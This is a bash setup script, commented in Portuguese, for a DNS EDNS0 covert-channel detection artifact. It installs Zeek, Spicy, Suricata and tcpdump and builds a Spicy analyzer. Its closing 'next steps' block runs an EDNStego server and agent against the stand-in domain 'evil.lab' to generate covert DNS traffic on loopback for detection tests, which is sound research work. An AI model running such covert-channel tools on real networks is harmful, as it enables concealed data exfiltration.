#!/usr/bin/env bash
#
# setup-edns0-env.sh
#
# Prepara uma VM Ubuntu limpa para executar o artefato "edns0-arbitrary"
# (SBSeg 2026 / CTA), instalando: git, Zeek (com suporte Spicy/spicyz),
# Suricata 7.0.x, tcpdump e as dependências Python do gerador EDNStego.
#
# Uso:
#   chmod +x setup-edns0-env.sh
#   ./setup-edns0-env.sh                 # instala Zeek binário (última release)
#   ./setup-edns0-env.sh --zeek-812      # compila Zeek 8.1.2 do fonte (lento)
#   ./setup-edns0-env.sh --skip-suricata # pula Suricata
#   ./setup-edns0-env.sh --verify        # só roda as verificações finais
#
# Todo o output é espelhado em ./setup-edns0-env.log, útil como registro
# de preparação de ambiente.
#

set -uo pipefail

# ---------------------------------------------------------------------------
# Configuração
# ---------------------------------------------------------------------------
REPO_URL="https://github.com/the-red-ace/edns0-arbitrary.git"
WORKDIR="${WORKDIR:-$HOME}"
REPO_DIR="$WORKDIR/edns0-arbitrary"
ZEEK_PREFIX="/opt/zeek"
ZEEK_SRC_VERSION="8.1.2"
LOGFILE="$(pwd)/setup-edns0-env.log"

BUILD_ZEEK_FROM_SOURCE=0
SKIP_SURICATA=0
VERIFY_ONLY=0

for arg in "$@"; do
  case "$arg" in
    --zeek-812)      BUILD_ZEEK_FROM_SOURCE=1 ;;
    --skip-suricata) SKIP_SURICATA=1 ;;
    --verify)        VERIFY_ONLY=1 ;;
    -h|--help)       sed -n '3,20p' "$0"; exit 0 ;;
    *) echo "Argumento desconhecido: $arg"; exit 1 ;;
  esac
done

exec > >(tee -a "$LOGFILE") 2>&1

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
say()  { printf '\n\033[1;34m==> %s\033[0m\n' "$*"; }
ok()   { printf '\033[1;32m  [OK]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m  [!]\033[0m %s\n' "$*"; }
err()  { printf '\033[1;31m  [X]\033[0m %s\n' "$*"; }

need_sudo() {
  if [ "$(id -u)" -ne 0 ] && ! command -v sudo >/dev/null 2>&1; then
    err "Este script precisa de root ou sudo."; exit 1
  fi
}
SUDO=""; [ "$(id -u)" -ne 0 ] && SUDO="sudo"

# ---------------------------------------------------------------------------
# 0. Detecção da distribuição
# ---------------------------------------------------------------------------
detect_distro() {
  say "Detectando distribuição"
  [ -r /etc/os-release ] || { err "/etc/os-release ausente."; exit 1; }
  # shellcheck disable=SC1091
  . /etc/os-release
  DISTRO_ID="${ID:-desconhecido}"
  DISTRO_VER="${VERSION_ID:-desconhecido}"
  DISTRO_CODENAME="${VERSION_CODENAME:-desconhecido}"
  OBS_DIST="xUbuntu_${DISTRO_VER}"

  echo "  Distro:   $DISTRO_ID $DISTRO_VER ($DISTRO_CODENAME)"
  echo "  Kernel:   $(uname -r)"
  echo "  Arquit.:  $(uname -m)"

  if [ "$DISTRO_ID" != "ubuntu" ]; then
    warn "Script escrito para Ubuntu. Em '$DISTRO_ID' os repositórios podem divergir."
  fi
}

# ---------------------------------------------------------------------------
# 1. Pacotes base
# ---------------------------------------------------------------------------
install_base() {
  say "Instalando pacotes base (git, curl, python3, tcpdump, build tools)"
  $SUDO apt-get update -qq
  $SUDO apt-get install -y --no-install-recommends \
    git curl ca-certificates gnupg lsb-release \
    software-properties-common \
    python3 python3-pip python3-venv \
    tcpdump \
    build-essential cmake make gcc g++ flex bison libpcap-dev libssl-dev \
    swig zlib1g-dev libmaxminddb-dev python3-dev
  ok "Pacotes base instalados"
}

# ---------------------------------------------------------------------------
# 2. Zeek — via repositório oficial (OBS) ou compilado do fonte
# ---------------------------------------------------------------------------
install_zeek_binary() {
  say "Instalando Zeek a partir do repositório oficial (openSUSE Build Service)"

  local repo="https://download.opensuse.org/repositories/security:/zeek/${OBS_DIST}/"
  local keyurl="https://download.opensuse.org/repositories/security:zeek/${OBS_DIST}/Release.key"

  if ! curl -fsSL --head "$repo" >/dev/null 2>&1; then
    err "Repositório OBS não encontrado para '$OBS_DIST'."
    warn "Verifique em https://software.opensuse.org/download.html?project=security%3Azeek&package=zeek"
    return 1
  fi

  echo "deb $repo /" | $SUDO tee /etc/apt/sources.list.d/security:zeek.list >/dev/null
  curl -fsSL "$keyurl" | gpg --dearmor \
    | $SUDO tee /etc/apt/trusted.gpg.d/security_zeek.gpg >/dev/null
  $SUDO apt-get update -qq

  # A linha 8.1.x é uma feature release transiente e normalmente NÃO é
  # publicada como pacote. Tentamos, em ordem, o que existir no repositório.
  local candidato
  for candidato in zeek-8.1 zeek zeek-8.0; do
    if apt-cache show "$candidato" >/dev/null 2>&1; then
      echo "  Pacote selecionado: $candidato"
      $SUDO apt-get install -y "$candidato" && { ok "Zeek instalado ($candidato)"; return 0; }
    fi
  done

  err "Nenhum pacote Zeek disponível no repositório."
  return 1
}

install_zeek_source() {
  say "Compilando Zeek $ZEEK_SRC_VERSION do fonte (isso leva de 30 a 90 minutos)"

  local tarball="zeek-${ZEEK_SRC_VERSION}.tar.gz"
  local url="https://download.zeek.org/${tarball}"

  if ! curl -fsSL --head "$url" >/dev/null 2>&1; then
    err "Tarball não encontrado em $url"
    warn "Confira as versões disponíveis em https://download.zeek.org/"
    return 1
  fi

  $SUDO apt-get install -y --no-install-recommends \
    libpcap-dev libssl-dev python3-dev zlib1g-dev cmake make gcc g++ \
    flex bison libmaxminddb-dev libkrb5-dev

  mkdir -p "$WORKDIR/build" && cd "$WORKDIR/build" || return 1
  [ -f "$tarball" ] || curl -fSLO "$url"
  tar xzf "$tarball"
  cd "zeek-${ZEEK_SRC_VERSION}" || return 1

  # --prefix mantém o layout esperado (/opt/zeek/bin/{zeek,spicyz})
  ./configure --prefix="$ZEEK_PREFIX" || { err "configure falhou"; return 1; }
  make -j"$(nproc)" || { err "make falhou"; return 1; }
  $SUDO make install || { err "make install falhou"; return 1; }
  ok "Zeek $ZEEK_SRC_VERSION compilado e instalado em $ZEEK_PREFIX"
}

setup_zeek_path() {
  say "Configurando PATH do Zeek"
  local zeekbin=""
  for cand in "$ZEEK_PREFIX/bin" /usr/local/zeek/bin /opt/zeek/bin /usr/bin; do
    [ -x "$cand/zeek" ] && { zeekbin="$cand"; break; }
  done

  if [ -z "$zeekbin" ]; then
    err "Binário 'zeek' não localizado após a instalação."
    return 1
  fi

  export PATH="$zeekbin:$PATH"
  if ! grep -qs "$zeekbin" "$HOME/.bashrc"; then
    echo "export PATH=$zeekbin:\$PATH" >> "$HOME/.bashrc"
    ok "PATH adicionado ao ~/.bashrc ($zeekbin)"
  else
    ok "PATH já presente no ~/.bashrc"
  fi
  echo "  Reabra o shell ou rode: export PATH=$zeekbin:\$PATH"
}

# ---------------------------------------------------------------------------
# 3. Suricata 7.0.x
# ---------------------------------------------------------------------------
install_suricata() {
  say "Instalando Suricata 7.0.x (PPA oficial OISF)"

  if $SUDO add-apt-repository -y ppa:oisf/suricata-7.0 2>/dev/null; then
    $SUDO apt-get update -qq
    if $SUDO apt-get install -y suricata; then
      ok "Suricata instalado via PPA"
    else
      warn "Instalação via PPA falhou; tentando pacote da distribuição"
      $SUDO apt-get install -y suricata || { err "Suricata não instalado"; return 1; }
    fi
  else
    warn "PPA indisponível para $DISTRO_CODENAME; usando pacote da distribuição"
    warn "ATENÇÃO: a versão pode divergir da 7.0.x exigida pelo artigo."
    $SUDO apt-get install -y suricata || { err "Suricata não instalado"; return 1; }
  fi

  # Ruleset Emerging Threats Open, usado na avaliação em configuração padrão
  if command -v suricata-update >/dev/null 2>&1; then
    $SUDO suricata-update update-sources || true
    $SUDO suricata-update || warn "suricata-update falhou (sem rede?)"
  fi
}

# ---------------------------------------------------------------------------
# 4. Repositório e dependências Python
# ---------------------------------------------------------------------------
clone_repo() {
  say "Clonando o artefato"
  if [ -d "$REPO_DIR/.git" ]; then
    ok "Repositório já presente em $REPO_DIR"
  else
    git clone "$REPO_URL" "$REPO_DIR" || { err "git clone falhou"; return 1; }
    ok "Clonado em $REPO_DIR"
  fi
  cd "$REPO_DIR" || return 1
  echo "  Commit atual: $(git rev-parse --short HEAD) ($(git log -1 --format=%cd --date=short))"
}

setup_python() {
  say "Criando venv e instalando dependências Python"
  cd "$REPO_DIR" || return 1
  [ -d .venv ] || python3 -m venv .venv
  # shellcheck disable=SC1091
  . .venv/bin/activate
  pip install --quiet --upgrade pip
  if [ -f requirements.txt ]; then
    pip install --quiet -r requirements.txt || warn "requirements.txt com falhas"
  else
    warn "requirements.txt ausente — instalando dependências do README"
  fi
  pip install --quiet dnspython scapy
  ok "venv pronto: source $REPO_DIR/.venv/bin/activate"
  python3 -m py_compile ednstego/*.py ednstego/techniques/*.py 2>/dev/null \
    && ok "Módulos do gerador compilam" \
    || warn "py_compile do gerador reportou erros"
  deactivate || true
}

# ---------------------------------------------------------------------------
# 5. Compilação do analisador Spicy (.hlto)
# ---------------------------------------------------------------------------
build_hlto() {
  say "Compilando o analisador Spicy (.hlto)"
  local dir="$REPO_DIR/plugin-spicy"
  [ -d "$dir" ] || { warn "Diretório plugin-spicy/ ausente"; return 1; }
  cd "$dir" || return 1

  if ! command -v spicyz >/dev/null 2>&1; then
    err "spicyz não encontrado no PATH."
    warn "Ele acompanha o Zeek (>= 5.0), na mesma pasta do binário 'zeek'."
    warn "NÃO é o pacote 'spice-client-gtk' sugerido pelo apt."
    return 1
  fi

  local spicy_src evt_src
  spicy_src="$(ls ./*.spicy 2>/dev/null | head -n1)"
  evt_src="$(ls ./*.evt 2>/dev/null | head -n1)"

  if [ -z "$spicy_src" ] || [ -z "$evt_src" ]; then
    err "Fontes .spicy/.evt não encontradas em plugin-spicy/"
    ls -la
    return 1
  fi

  echo "  Fontes: $spicy_src  $evt_src"
  if spicyz -o edns0_arbitrary.hlto "$spicy_src" "$evt_src"; then
    ok "Gerado: $dir/edns0_arbitrary.hlto"
  else
    err "Compilação do .hlto falhou — registre esta saída no parecer."
    return 1
  fi
}

# ---------------------------------------------------------------------------
# 6. Verificação final
# ---------------------------------------------------------------------------
verify() {
  say "Verificação do ambiente"
  local falhas=0

  check() {
    local nome="$1"; shift
    if out="$("$@" 2>&1 | head -n1)"; then
      printf '  %-14s %s\n' "$nome" "$out"
    else
      printf '  %-14s \033[1;31mAUSENTE\033[0m\n' "$nome"; falhas=$((falhas+1))
    fi
  }

  check "git"       git --version
  check "python3"   python3 --version
  check "tcpdump"   tcpdump --version
  check "zeek"      zeek --version
  check "spicyz"    spicyz --version
  check "suricata"  suricata -V

  echo
  if zeek -N 2>/dev/null | grep -qi 'Zeek::Spicy'; then
    ok "Suporte Spicy embutido no Zeek confirmado"
    zeek -N | grep -i spicy | sed 's/^/    /'
  else
    err "Zeek::Spicy NÃO disponível — o plugin do artefato não vai carregar"
    falhas=$((falhas+1))
  fi

  echo
  if [ -f "$REPO_DIR/plugin-spicy/edns0_arbitrary.hlto" ]; then
    ok "Analisador compilado presente (edns0_arbitrary.hlto)"
  else
    warn "edns0_arbitrary.hlto ausente — rode a etapa de compilação"
  fi

  echo
  if [ "$falhas" -eq 0 ]; then
    ok "Ambiente pronto. Log completo em: $LOGFILE"
    cat <<'EOF'

  Próximos passos (teste mínimo do README):
    cd ~/edns0-arbitrary && source .venv/bin/activate
    python3 -m ednstego.server --listen 127.0.0.1 --port 5300 --domain evil.lab &
    sudo tcpdump -i lo -w /tmp/t1.pcap udp port 5300 &
    python3 -m ednstego.agent --server evil.lab --resolver 127.0.0.1 --mode t1 --duration 20
    sudo pkill tcpdump
    zeek -r /tmp/t1.pcap plugin-spicy/edns0_arbitrary.hlto \
         plugin-spicy/edns0_arbitrary.zeek regras/zeek/edns0-detection.zeek
    grep H1a notice.log

EOF
  else
    err "$falhas verificação(ões) falharam. Reveja o log: $LOGFILE"
    return 1
  fi
}

# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
main() {
  echo "=== setup-edns0-env.sh — $(date -Is) ==="
  need_sudo
  detect_distro

  if [ "$VERIFY_ONLY" -eq 1 ]; then
    setup_zeek_path >/dev/null 2>&1 || true
    verify; exit $?
  fi

  install_base
  if [ "$BUILD_ZEEK_FROM_SOURCE" -eq 1 ]; then
    install_zeek_source || warn "Compilação do fonte falhou; tentando binário"
    command -v zeek >/dev/null 2>&1 || install_zeek_binary
  else
    install_zeek_binary || warn "Instalação binária falhou; use --zeek-812"
  fi
  setup_zeek_path
  [ "$SKIP_SURICATA" -eq 0 ] && install_suricata
  clone_repo && setup_python
  build_hlto || warn "Etapa .hlto não concluída"
  verify
}

main "$@"
